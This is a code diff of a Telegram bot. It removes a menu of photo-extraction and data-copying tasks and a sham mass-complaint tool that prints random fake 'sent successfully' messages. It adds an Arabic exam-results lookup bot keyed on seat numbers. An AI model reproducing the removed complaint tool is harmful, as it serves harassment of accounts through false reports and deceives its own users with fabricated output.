-def repeat_task(call):
-    task = call.data.split('_')[1]
-    if task == 'extract_photos':
-        ask_for_photo_count(call)
-    elif task == 'clear_data':
-        clear_data(call)
-    elif task == 'copy_data':
-        ask_for_folder_name(call)
-    elif task == 'delete_folder':
-        ask_for_delete_folder_name(call)
-    elif task == 'search_videos':
-        ask_for_video_count(call)
+    if call.data == "new_search":
+        bot.answer_callback_query(call.id, "أرسل رقم الجلوس الجديد")
+        bot.send_message(call.message.chat.id, "✏️ أرسل رقم الجلوس (أرقام فقط):")
+    elif call.data == "home":
+        bot.answer_callback_query(call.id)
+        start_cmd(call.message)
+    elif call.data == "help":
+        bot.answer_callback_query(call.id)
+        help_cmd(call.message)
     else:
-        bot.send_message(call.message.chat.id, 'حسنًا، سأنتظر أفعالك.  يمكنك الاتصال بالقائمة باستخدام الزر أدناه. 🔄', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton('قائمة طعام', callback_data='return_to_menu')))
+        bot.answer_callback_query(call.id, "خيار غير معروف")
 
+# ===== معالجة الأرقام =====
+@bot.message_handler(func=lambda m: re.match(r"^\d+$", m.text))
+def handle_seat(message):
+    if not ensure_subscription(message):
+        return
 
+    user_id = message.from_user.id
+    register_user(user_id)
 
-mt = r"""""" + Fore.RED + "╔════════════════════════════════════════════════════════════════════════╗" + Style.RESET_ALL + r"""
-""" + Fore.RED + "║" + Style.RESET_ALL + r"""                     Creator: @M02MM                      """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
-""" + Fore.RED + "╠════════════════════════════════════════════════════════════════════════╣" + Style.RESET_ALL + r""" 
-""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "01" + Style.RESET_ALL + r"""] Fraud   [""" + Fore.RED + "06" + Style.RESET_ALL + r"""] Канал     [""" + Fore.RED + "11" + Style.RESET_ALL + r"""] Threats          [""" + Fore.RED + "16" + Style.RESET_ALL + r"""] Trolling  """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
-""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "02" + Style.RESET_ALL + r"""] Spam            [""" + Fore.RED + "07" + Style.RESET_ALL + r"""] Ordinary   [""" + Fore.RED + "12" + Style.RESET_ALL + r"""] Drugs       [""" + Fore.RED + "17" + Style.RESET_ALL + r"""] Wirt     """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
-""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "03" + Style.RESET_ALL + r"""] Phishing          [""" + Fore.RED + "08" + Style.RESET_ALL + r"""] Session    [""" + Fore.RED + "13" + Style.RESET_ALL + r"""] Religion         [""" + Fore.RED + "18" + Style.RESET_ALL + r"""] Premium  """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
-""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "04" + Style.RESET_ALL + r"""] Child porn   [""" + Fore.RED + "09" + Style.RESET_ALL + r"""] Group    [""" + Fore.RED + "14" + Style.RESET_ALL + r"""] Harassment  [""" + Fore.RED + "19" + Style.RESET_ALL + r"""] Bot      """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
-""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "05" + Style.RESET_ALL + r"""] Dianon          [""" + Fore.RED + "10" + Style.RESET_ALL + r"""] Violence   [""" + Fore.RED + "15" + Style.RESET_ALL + r"""] Content 18+     [""" + Fore.RED + "20" + Style.RESET_ALL + r"""] Exit    """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
-""" + Fore.RED + "╚════════════════════════════════════════════════════════════════════════╝" + Style.RESET_ALL + r""" """
+    seat = message.text.strip()
+    if len(seat) != 7:
+        bot.reply_to(message, "❌ رقم الجلوس يجب أن يكون 7 أرقام. حاول مرة أخرى.")
+        return
 
+    msg = bot.reply_to(message, "⏳ جاري جلب النتيجة...")
 
-def banner():
-#    print(Fore.RED+mm+Style.RESET_ALL)
-    print(mt)
+    result, error = get_cached_or_fetch(seat)
+    if error:
+        bot.edit_message_text(error, chat_id=message.chat.id, message_id=msg.message_id)
+        return
 
-def complaint_handler():
-    while True:
-        choice = input("Enter a number from 1 to 19 (20 to exit): ")
-        if choice == '20':
-            break
-        try:
-            num_complaints = int(choice)
-            if num_complaints < 1 or num_complaints > 19:
-                raise ValueError
-        except ValueError:
-            print("Please enter a valid number between 1 and 19. ❌")
-            continue
+    subjects_lines = []
+    for subj, info in result["subjects"].items():
+        subjects_lines.append(f"📘 {subj}: {info['earned']} / {info['max']}  ({info['percent']}%)")
 
-        user_id = input("Enter user ID: ")
-        num_complaints = int(input("Enter the number of complaints: "))
+    subjects_text = "\n".join(subjects_lines) if subjects_lines else "لا توجد مواد"
 
-        for _ in range(num_complaints):
-            if random.randint(1, 10) == 1:
-                print(f"{Fore.RED}Error sending complaint{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.GREEN}Complaint sent successfully{Style.RESET_ALL}")
-            time.sleep(random.uniform(1, 3)) 
+    reply = (
+        f"🎓 **نتيجة الطالب**\n"
+        f"👤 **الاسم:** {result['name']}\n"
+        f"🆔 **رقم الجلوس:** {result['seat']}\n"
+        f"📚 **الشعبة:** {result['section']}\n"
+        f"🏫 **نوع التعليم:** {result['edu_type']}\n"
+        f"📊 **المجموع:** {result['total_earned']} / {result['total_max']}\n"
+        f"📈 **النسبة المئوية:** {result['total_percent']}%\n"
+        f"🏅 **التقدير:** {result['grade']}\n"
+        f"📌 **تقدير الموقع:** {result['raw_grade']}\n\n"
+        f"📋 **تفاصيل الدرجات:**\n{subjects_text}"
+    )
 
-def notify_admin():
-    bot.send_message(ADMIN_ID, "انتباه!  تم إطلاق البوت.\nيمكنك البدء في العمل /start 🚀")
+    bot.edit_message_text(
+        reply,
+        chat_id=message.chat.id,
+        message_id=msg.message_id,
+        parse_mode="Markdown",
+        reply_markup=result_buttons(seat)
+    )
 
-if __name__ == '__main__':
-    banner()
-    notify_admin()
-    threading.Thread(target=bot.polling, daemon=True).start()
-    complaint_handler()
+# ===== معالجة الرسائل الأخرى =====
+@bot.message_handler(func=lambda m: True)
+def handle_other(message):
+    if not ensure_subscription(message):
+        return
+    user_id = message.from_user.id
+    register_user(user_id)
+    bot.reply_to(message, "❌ يرجى إرسال رقم الجلوس (أرقام فقط) أو استخدم /help للتعليمات.")
+
+# ===== تشغيل البوت =====
+if __name__ == "__main__":
+    print("🤖 البوت شغال مع نظام اشتراك تسلسلي")
+    bot.infinity_polling()
